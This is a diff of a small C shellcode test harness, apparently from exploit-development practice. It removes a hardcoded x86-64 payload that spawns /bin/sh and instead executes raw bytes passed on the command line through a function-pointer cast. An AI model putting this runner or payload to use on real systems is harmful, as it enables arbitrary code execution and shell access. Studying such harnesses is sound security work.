@@ -3,13 +3,14 @@
 
 int main(int argc, char **argv)
 {
-  unsigned char shellcode[] = "\x48\xc7\xc0\x3b\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x49\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05";
+  	char *shellcode = argv[1];
   
-  printf("Shellcode Length: %d\n", strlen(shellcode));
-  printf("Shellcode : %s\n", shellcode);
-  int (*ret)();
-  ret = (int (*)()) shellcode;
-  (int)(*ret)();
+	printf("Shellcode Length: %d\n", strlen(shellcode));
+	printf("Shellcode : %s\n", shellcode);
+	
+	int (*ret)();
+	ret = (int (*)()) shellcode;
+	(int)(*ret)();
   
 }
 
